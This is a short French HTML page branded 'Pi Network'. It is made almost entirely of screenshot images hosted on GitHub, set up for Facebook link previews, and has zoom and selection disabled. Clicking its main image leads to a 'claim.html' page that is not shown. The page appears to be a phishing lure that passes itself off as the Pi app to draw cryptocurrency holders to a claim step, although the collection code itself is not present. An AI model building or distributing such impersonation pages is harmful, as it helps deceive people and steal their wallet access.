<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Pi Network</title>
    
    <!-- Balises Open Graph pour l'aperçu Facebook -->
    <meta property="og:title" content="Pi Network">
    <meta property="og:description" content="Découvrez Pi Network, la cryptomonnaie accessible à tous">
    <meta property="og:image" content="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_204937227.jpg?raw=true">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:url" content="https://votre-site.com">
    <meta property="og:type" content="website">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: #000;
            min-height: 100vh;
            /* Désactiver le zoom et le défilement tactile */
            touch-action: pan-x pan-y;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            overflow-x: hidden;
        }
        
        html {
            touch-action: manipulation;
        }
        
        .main-image, .continuation-image {
            width: 100%;
            height: auto;
            display: block;
            /* Supprime tout espace entre les images */
            vertical-align: bottom;
        }
        
        .footer {
            /* Fixe le footer en bas de l'écran */
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            /* Place le footer au-dessus des autres éléments */
            z-index: 10;
        }
        
        .footer img {
            width: 100%;
            height: auto;
            display: block;
        }
        
        /* Image d'aperçu Facebook masquée */
        .facebook-preview-image {
            position: absolute;
            opacity: 0;
            width: 1px;
            height: 1px;
            overflow: hidden;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <!-- Image d'aperçu Facebook (masquée) -->
    <img class="facebook-preview-image" 
         src="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_204937227.jpg?raw=true" 
         alt="Aperçu Facebook">
    
    <!-- Image principale cliquable -->
    <img class="main-image" 
         src="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_103151554.jpg?raw=true" 
         alt="Image principale" 
         onclick="window.location.href='claim.html'">
    
    <!-- Image de continuation -->
    <img class="continuation-image" 
         src="https://github.com/Walyy578/Pi-Browser/blob/main/Screenshot_20250930-163639.jpg?raw=true" 
         alt="Suite de l'image">
    
    <!-- Pied de page fixe -->
    <footer class="footer">
        <img src="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_165420094.jpg?raw=true" 
             alt="Pied de page">
    </footer>
</body>
</html>
